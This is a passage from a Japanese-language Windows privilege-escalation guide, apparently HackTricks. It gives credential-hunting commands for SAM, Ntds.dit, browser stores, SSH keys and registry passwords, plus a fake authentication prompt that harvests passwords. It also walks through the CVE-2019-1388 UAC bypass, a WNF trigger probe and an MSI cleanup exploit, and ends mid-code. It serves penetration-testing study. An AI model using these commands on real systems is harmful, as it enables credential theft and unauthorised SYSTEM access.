  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### ログ

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### 認証情報を尋ねる

知っている可能性があると思うなら、**ユーザーに自分の認証情報、あるいは別のユーザーの認証情報を入力するよう求める**こともできます（クライアントに**認証情報**を直接**尋ねる**のは、非常に**リスクが高い**ことに注意してください）。

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **認証情報を含む可能性のあるファイル名**

過去に**パスワード**が**平文**または**Base64**で含まれていたことが確認されているファイル名。

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

#### Password Safe 拡張子なしのファイル名リスト版

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3 のデータベースでは、一般的に `.psafe3` 拡張子が使われます。一致するファイル名は暗号化された vault の候補として扱ってください。そのファイルが存在しても、読み取り、ロック解除、保存された認証情報の利用が可能であるとは限りません。このようなファイルの保存場所を確認する際は、アクセス可能なユーザープロファイルと、設定済みのファイル共有ルートを調べてください。

読み取り可能な KeePass `.kdbx` も、暗号化された vault の手がかりにすぎません。ロックを解除するには、実際の master-password と、設定されている key-file やアカウント要素が必要です。認可された調査でエントリに LM:NT hash pair が見つかった場合は、[pass-the-hash](../ntlm/README.md#pass-the-hash) を検討する前に、記載されたアカウントと、NT hash が現在も有効で、対象の NTLM サービスで受け入れられるかを確認してください。vault のエントリだけで Administrator または SYSTEM の権限が得られるわけではありません。リモートサービスへのアクセス、アカウント権限、および別途必要となるサービス実行の手順も、すべて満たす必要があります。インベントリには vault のパスと読み取り可否を記録し、データベースや保存された認証情報は出力しないでください。

提案されているすべてのファイルを検索します。

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

#### Password Safe 拡張機能を使わない検索コマンドの亜種

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### ごみ箱内の認証情報

認証情報がないか、ごみ箱も確認してください。

アクセス可能なごみ箱のエントリを確認し、削除されたバックアップや設定アーカイブのほか、ファイル名に認証情報が明記されているファイルを探してください。有用な `.7z`、`.zip`、`.rar` のバックアップは、数か月前のもので、ありふれたファイル名が付いている場合もあります。Windows は元のパスと削除時刻を `$I` レコードに保存し、削除されたファイルを対応する `$R` エントリとして保存します。アーカイブを開く前に、メタデータと現在の ID による読み取りアクセス権を確認してください。表示される内容はボリューム、ユーザー SID、ファイル権限によって異なるため、一覧が空でも、復元可能なバックアップが存在しないとは限りません。アーカイブ名は調査候補として扱い、有効な秘密情報が含まれている証拠とは見なさないでください。

アクセス可能な削除済み `.pfx` ファイルは、**コード署名**の手掛かりになることもあります。アクセス可能な秘密鍵が含まれていれば、その鍵を使って変更した PowerShell スクリプトに署名できます。[PowerShell では秘密鍵を持つコード署名証明書が必要です](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature)。また、[AppLocker の発行元ルールでは、署名者の ID とルールの適用範囲が評価されます](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker)。アカウントをまたいで実行するには、現在の ID が対象のスクリプトを変更できること、変更後の署名がスクリプトと対象アカウントに対する有効なルールで受け入れられること、そしてスケジュールされたタスクなどのより高い権限を持つ実行主体が実際にそのスクリプトを実行することが必要です。`.pfx` というファイル名、証明書のサブジェクト、または書き込み可能なスクリプトだけでは、一連の条件が満たされている証拠にはなりません。秘密鍵を開いたりタスクを実行したりする前に、メタデータ、ACL、ポリシー、スケジュールされたコマンドを確認してください。

アクセス可能なメッセージングクライアントのプロファイルデータベース、メモ、受信ファイルも確認し、認証情報の手掛かりを探してください。BitLocker 回復キーのエクスポートファイルは HTML または TXT 形式で保存されていることがあり、名前付きのバックアップアーカイブ内にある場合もあります。このようなファイルから、古いバックアップを含む別の暗号化データボリュームにアクセスできる可能性があります。アクセスが許可されている場合に限り、ボリュームとアーカイブを調査してください。バックアップに `NTDS.dit` が含まれている場合、オフラインでドメイン認証情報を復元するには、[バックアップと特権グループのワークフロー](../active-directory-methodology/privileged-groups-and-token-privileges.md)で説明されているように、対応する `SYSTEM` ハイブも必要です。ファイル名やロックされたボリュームだけでは、使用可能な回復キーやドメインバックアップが存在する証拠にはなりません。

複数のプログラムに保存された**パスワードを復元する**には、次を使用できます: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### レジストリ内

**認証情報が保存されている可能性のあるその他のレジストリキー**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**レジストリから openssh keys を抽出する。**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ブラウザーの履歴

**Chrome または Firefox** のパスワードが保存されているデータベースを確認してください。\
**Chrome、Edge、または Firefox** のパスワードが保存されているデータベースを確認してください。\
また、ブラウザーの履歴、ブックマーク、お気に入りも確認してください。そこに**パスワードが保存されている**可能性があります。

現在のユーザーの標準的な Edge **Default** プロファイルでは、`Login Data` は `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default` にあり、`Local State` は親ディレクトリの `User Data` にあります。[Microsoft のドキュメントでは既定のプロファイルの場所が説明されています](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars)。別のプロファイルや `UserDataDir` ポリシーによって、場所が変更されることがあります。ファイルの存在は、認証情報の保存場所を特定する手掛かりにすぎません。読み取り可能なファイルか、該当ユーザーの DPAPI コンテキストやその他の許可された鍵素材を利用できるか、保存されたログイン情報がより高い権限を持つアカウントのものかを確認してください。パスのみを列挙する場合、データベースを開いたり、復号したパスワードを出力したりする必要はありません。

Firefox について、[Mozilla のドキュメント](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile)によると、プロファイル内の `key4.db` と `logins.json` は、鍵ファイルと暗号化されたログイン情報ファイルのペアです。これらのファイルの存在は手掛かりにすぎません。両方のファイルが読み取り可能か、保存されたエントリがあるか、認証情報を利用できると判断する前に Primary Password で鍵が保護されているかを確認してください。復元した認証情報がドメインアカウントのものなら、そのアカウントが実効的に持つグループ制御権限と、そのグループの[LAPS パスワードの読み取り権限または復号権限](../active-directory-methodology/laps.md)を別々に確認してください。ブラウザーのアーティファクトだけでは、管理者権限を得られる経路があるとは判断できません。

ブラウザーからパスワードを抽出するツール:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** は、異なる言語で作成されたソフトウェアコンポーネント間の**相互通信**を可能にする、Windows オペレーティングシステムに組み込まれた技術です。各 COM コンポーネントは**クラス ID (CLSID) で識別され**、各コンポーネントは、インターフェイス ID (IID) で識別される 1 つ以上のインターフェイスを介して機能を公開します。

COM クラスとインターフェイスは、それぞれレジストリの **HKEY\CLASSES\ROOT\CLSID** と **HKEY\CLASSES\ROOT\Interface** に定義されています。このレジストリは、**HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** を統合して作成されます (**HKEY\CLASSES\ROOT**)。

このレジストリの CLSID 内には、子レジストリ **InProcServer32** があります。そこには **DLL** を指す**既定値**と、**Apartment** (シングルスレッド)、**Free** (マルチスレッド)、**Both** (シングルまたはマルチスレッド)、**Neutral** (スレッドに依存しない) のいずれかを指定する **ThreadingModel** 値が含まれています。

![ブラウザーの履歴 - COM DLL Overwriting: このレジストリの CLSID 内には、子レジストリ InProcServer32 があります。そこには DLL を指す既定値と、値...](<../../images/image (729).png>)

基本的に、実行される **DLL のいずれかを上書き**でき、その DLL が別のユーザーによって実行される場合、**権限昇格**が可能です。

攻撃者が永続化の手段として COM Hijacking をどのように使用するかについては、以下を確認してください。


{{#ref}}
com-hijacking.md
{{#endref}}

### **ファイルとレジストリ内の一般的なパスワード検索**

**ファイルの内容を検索する**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**特定のファイル名のファイルを検索する**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**レジストリでキー名とパスワードを検索する**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### パスワードを検索するツール

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **は私が作成した msf** プラグインで、被害者のシステム内の認証情報を検索する Metasploit の POST モジュールをすべて**自動実行**します。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) は、このページで紹介されているパスワードを含むファイルをすべて自動的に検索します。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) は、システムからパスワードを抽出するもうひとつの優れたツールです。

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) は、データを平文で保存する複数のツール（PuTTY、WinSCP、FileZilla、SuperPuTTY、RDP）の**セッション**、**ユーザー名**、**パスワード**を検索します。

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

SYSTEM として実行中のプロセスが、**フルアクセス権で新しいプロセスを開く**（`OpenProcess()`）とします。同じプロセスがさらに、**低い権限で新しいプロセスを作成し**（`CreateProcess()`）、メインプロセスの開いているすべてのハンドルを継承させます。\
その後、**低権限プロセスへのフルアクセス権**を取得できれば、`OpenProcess()` で作成された**特権プロセスへのオープンハンドル**を取得し、**shellcode を注入**できます。\
この脆弱性の**検出と悪用方法**については、[こちらの例を参照してください。](leaked-handle-exploitation.md)\
プロセスやスレッドのオープンハンドルが異なる権限レベルで継承される場合（フルアクセスに限りません）のテスト方法と悪用方法については、[こちらの別の投稿で、より詳しく解説されています。](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)

## Named Pipe Client Impersonation

**パイプ**と呼ばれる共有メモリセグメントを使うと、プロセス間の通信やデータ転送が可能になります。

Windows には **Named Pipes** という機能があり、ネットワークをまたぐ場合も含め、無関係なプロセス間でデータを共有できます。これは、**named pipe server** と **named pipe client** の役割を定義したクライアント／サーバーアーキテクチャに似ています。

**クライアント**がパイプを介してデータを送信すると、そのパイプを設定した**サーバー**は、必要な **SeImpersonate** 権限を持っていれば、**クライアントになりすます**ことができます。模倣可能なパイプを介して通信する**特権プロセス**を見つければ、そのプロセスが自分の設定したパイプとやり取りした際にそのプロセスのIDを採用し、**より高い権限を取得**できる可能性があります。この攻撃の実行方法については、[**こちら**](named-pipe-client-impersonation.md)と[**こちら**](#from-high-integrity-to-system)のガイドが参考になります。

また、次のツールを使うと、burp のようなツールで**名前付きパイプの通信を傍受**できます：[**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept)。さらに、こちらのツールでは、すべてのパイプを一覧表示して確認し、privescs を探すことができます：[**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

サーバーモードの Telephony サービス（TapiSrv）は、`\\pipe\\tapsrv`（MS-TRP）を公開します。リモートの認証済みクライアントは、mailslot ベースの非同期イベント経路を悪用し、`ClientAttach` を使って、`NETWORK SERVICE` が書き込み可能な既存ファイルの任意の位置に**4バイトを書き込めます**。その後、Telephony 管理者権限を取得し、サービスとして任意の DLL を読み込ませることができます。全体の流れは次のとおりです。

- `pszDomainUser` に書き込み可能な既存パスを設定して `ClientAttach` を実行します。サービスは `CreateFileW(..., OPEN_EXISTING)` でそのファイルを開き、非同期イベントの書き込みに使用します。
- 各イベントは、`Initialize` で指定した攻撃者制御の `InitContext` をそのハンドルに書き込みます。`LRegisterRequestRecipient`（`Req_Func 61`）で line app を登録し、`TRequestMakeCall`（`Req_Func 121`）を実行してから、`GetAsyncEvents`（`Req_Func 0`）で取得します。その後、登録解除／シャットダウンを行うことで、決定的な書き込みを繰り返せます。
- `[TapiAdministrators]` に自分を追加して `C:\Windows\TAPI\tsec.ini` に保存し、再接続します。その後、任意の DLL パスを指定して `GetUIDllName` を呼び出すと、`NETWORK SERVICE` として `TSPI_providerUIIdentify` を実行できます。

詳細：

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### Windows で実行可能なファイル拡張子

**[https://filesec.io/](https://filesec.io/)** を確認してください。

### Markdown レンダラーを介した Protocol handler / ShellExecute の悪用

`ShellExecuteExW` に渡されるクリック可能な Markdown リンクは、危険な URI handler（`file:`、`ms-appinstaller:`、または登録済みの任意の scheme）を起動し、現在のユーザーとして攻撃者が制御するファイルを実行する可能性があります。詳細：

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **パスワードを含むコマンドラインの監視**

ユーザーとして shell を取得したとき、**コマンドラインに認証情報を渡して**実行されるスケジュール済みタスクやその他のプロセスが存在する場合があります。以下のスクリプトは、2秒ごとにプロセスのコマンドラインを取得し、現在の状態と前回の状態を比較して、差分を出力します。

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## プロセスからパスワードを盗む

## 低権限ユーザーから NT\AUTHORITY SYSTEM へ (CVE-2019-1388) / UAC Bypass

グラフィカルインターフェース（コンソールまたは RDP 経由）にアクセスでき、UAC が有効になっている場合、Microsoft Windows の一部のバージョンでは、非特権ユーザーから「NT\AUTHORITY SYSTEM」としてターミナルやその他のプロセスを実行できます。

これにより、同じ脆弱性を利用して、特権昇格と UAC のバイパスを同時に実行できます。さらに、何もインストールする必要はなく、このプロセスで使用するバイナリは Microsoft によって署名・発行されています。

影響を受けるシステムには、以下のものがあります：

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

この脆弱性を悪用するには、次の手順を実行する必要があります:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

必要なファイルと情報は、以下の GitHub リポジトリにすべてあります。

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Administrator Medium から High Integrity Level への移行 / UAC Bypass

**Integrity Levels について学ぶには、こちらを読んでください:**


{{#ref}}
integrity-levels.md
{{#endref}}

次に、**UAC と UAC bypasses について学ぶには、こちらを読んでください:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Served Root への Upload Directory Junctions

アプリケーションが予測可能なアップロード用サブディレクトリを作成し、呼び出し元から渡されたファイル名でそこにファイルを書き込んでから、そのファイルを処理することがあります。低権限ユーザーがサーバー側で書き込みが行われる前にそのサブディレクトリを削除し、NTFS junction に置き換えられる場合、書き込みが junction をたどって Web から配信されるディレクトリに到達する可能性があります。サーバーがそのファイル形式を実行する場合、そこに置かれたスクリプトは Web サービスの ID で実行される可能性があります。これはアプリケーション固有の任意書き込み境界です。書き込み可能なアップロードディレクトリや既存の junction があるだけでは、その境界の存在を証明できません。

アップロードハンドラーでの正確なパス構築と処理タイミング、ユーザーがサブディレクトリに対して持つ実効的な削除・作成権限、宛先の実効 ACL、書き込み処理が reparse point をたどるかどうか、そして Web サーバーが宛先でファイルを実行するかどうかを確認してください。書き込み処理と Web サーバーのプロセス ID は、それぞれ別に確認してください。受動的なインベントリからディレクトリ ACL と reparse メタデータは確認できますが、ハンドラーの動作や将来の junction の差し替えまでは確認できません。実行がサービスアカウントで行われる場合、別の token-privilege 経路を検討する前に、**実際のプロセストークン**を確認してください。

## WNF-triggered な特権 scheduled-task cleanup

手動実行が拒否される scheduled task でも、権限のないユーザーが利用できるトリガーが存在することがあります。特権タスクを監査するときは、XML をエクスポートし、タスクの DACL、principal、action とともに**すべての**トリガーを確認してください。特に `WnfStateChangeTrigger` は Windows Notification Facility（WNF）の state を指定します。その保護可能な state への更新を現在のユーザーが publish できる場合、`<AllowStartOnDemand>false</AllowStartOnDemand>` に設定されていても、ユーザーは設定された ID でタスクを間接的に起動できます。<sup>[[43]](#references)</sup>

たとえば Recall の `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` タスクは SYSTEM として実行され、標準ユーザーからの WNF state `7508BCA32C079E41` への更新を受け付け、Recall が無効になっている場合でも `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}` を検査していました。<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

到達可能性をテストするには、`ntdll.dll` から `ZwUpdateWnfStateData` を解決し、8 バイトの state name に対して空の更新を送信して、戻り値のステータスをタスクの最終実行データまたは Procmon のアクティビティと照合します。以下の簡略化したプローブでは、Recall タスクの例にあるバイト列を使用しています。テスト対象のタスク向けにエクスポートされたバイト列に置き換えてください。<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### 再帰的なクリーンアップを特権削除に利用する

有用なプリミティブはトリガーだけではなく、攻撃者が制御するディレクトリを受け取る特権クリーンアップルーチンです。列挙から最終的な変更まで処理を追跡してください。プロファイル／セッションの検出、ワイルドカードで選択される子要素、`SHCreateItemFromParsingName`、`IFileOperation::DeleteItem` は、事前に確認されたパス名が後で再帰的にたどられることを示す強い手掛かりです。子孫要素が信頼できるディレクトリハンドルを基準に開かれ、削除前に検証されない場合、攻撃者は列挙と使用の間に解決先を変更できます。<sup>[[43]](#references)</sup>

WNFトリガーを、以下で説明する[oplock、junction、Object Manager symlinkによる置換](#from-folder-contents-delete-to-system-eop)と組み合わせます。oplockによって、正規の子要素を選択した後にクリーンアップ処理を一時停止させ、その間に書き込み可能な祖先ディレクトリを置き換えます。再開後、特権削除処理は `\RPC Control` 経由で保護対象を解決します。Recallの攻撃チェーンでは、これによりSYSTEM権限で `C:\Config.Msi` を削除でき、文書化されているMSIロールバック手法に必要な条件が満たされました。<sup>[[31]](#references)[[43]](#references)</sup>

### 入れ子の子孫要素は浅いreparse point対策を回避する

攻撃者が制御するルートとその直下の子要素だけを検証しても、パス名ベースの再帰削除は安全になりません。検証済みのオブジェクトは正規のままにしつつ、junction/oplockによる置換をその下の追加の子要素に仕込みます。`IFileOperation::DeleteItem` は最終的に未検証の子孫要素まで到達し、新たなターゲットをたどります。CVE-2026-20941は、最初のRecallパッチが `UKP` とGUID形式のディレクトリを検証した一方で、従来の再帰削除処理を残したため、まさにこの種の不完全な修正によって発生しました。<sup>[[43]](#references)</sup>

安全なパターンは、**すべての子孫要素**を、すでに信頼されているディレクトリハンドルを基準に開き、最終的に解決されたパス／オブジェクトを取得して検証したうえで、その検証済みハンドルに対して削除 disposition を適用することです。プレフィックスを検証した後、パス名ベースの再帰削除に戻ってはいけません。パッチレビューでは、実際の呼び出し箇所における構造体も確認してください。この事例では、`NtCreateFile` に渡される `OBJECT_ATTRIBUTES` を実行時に調べると、`RootDirectory` が非NULLで、名前が相対パスの `{GUID}\\secure_file.lock` であることが判明しました。これは、2つ目の `FILE_DELETE_ON_CLOSE` プリミティブがあると示唆する誤解を招く逆コンパイラ出力を否定するものでした。<sup>[[43]](#references)</sup>

## 任意のフォルダー削除／移動／名前変更からSYSTEM EoPへ

この手法は、[**このブログ記事**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)で説明されており、exploit codeは[**こちらから入手できます**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)。<sup>[[31]](#references)[[32]](#references)</sup>

この攻撃は基本的に、Windows Installerのロールバック機能を悪用し、アンインストール中に正規ファイルを悪意のあるファイルで置き換えます。そのために攻撃者は、`C:\Config.Msi` フォルダーを乗っ取るための**悪意のあるMSI installer**を作成する必要があります。このフォルダーは後に、Windows Installerが他のMSIパッケージのアンインストール中にロールバックファイルを保存するために使用します。ロールバックファイルには、悪意のあるpayloadが含まれるよう変更が加えられます。

### Windows Installer COMクリーンアップパスへのインジェクション（CVE-2025-27727）

低権限のクライアントは、`CMsiConfigurationManager` COMオブジェクト（CLSID/IID `{000C101C-0000-0000-C000-000000000046}`）を通じて、SYSTEM権限で動作する `msiexec.exe` サービスにアクセスできます。リバースエンジニアリングにより、関連する `IMsiServer` 呼び出しは、vtableオフセット `0xA0` の `MsiBeginTransactionW`、`0xC8` の `SetEEUIDirectoryAndFilter`、`0x50` の `CleanupTempPackages` であることが特定されました。これらの名前とオフセットはリバースエンジニアリングによるものであり、ビルドによって異なる場合があります。<sup>[[41]](#references)</sup>

非管理者の場合、`SetEEUIDirectoryAndFilter` は、指定されたパスを `DELETE`、`FILE_FLAG_BACKUP_SEMANTICS`、`FILE_FLAG_OPEN_REPARSE_POINT` を指定して開く間だけ呼び出し元を偽装します。これにより、呼び出し元がディレクトリを削除できることが確認され、reparse pointをたどることも回避できます。しかし、確認済みのファイルオブジェクトが後続のクリーンアップ処理に結び付けられるわけではなく、そのファイルがWindows Installerによって作成されたことを証明するものでもありません。<sup>[[41]](#references)</sup>

`MsiBeginTransactionW` の後、`SetEEUIDirectoryAndFilter` は呼び出し元のfilter引数に関係なく、そのパスをフォルダーとして登録します。サービスは、`HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages` の下に名前付きの `REG_DWORD` 値を書き込みます。値の名前は呼び出し元が制御するパスで、データ `0x00000002` はフォルダーフラグです。その後、`CleanupTempPackages(NULL, FALSE)` を呼び出すと、クリーンアップ処理に直接入ります。昇格された権限で動作するワーカーはレジストリ値を列挙し、フォルダー項目をパスの由来を確認せずに再帰的な `FDeleteFolder` に渡します。通常の削除に失敗すると、コードは `LockdownPath` も呼び出し、ファイル属性をクリアして再試行します。<sup>[[41]](#references)</sup>

`msi.dll` から復元された最小の呼び出しシーケンスは次のとおりです。<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
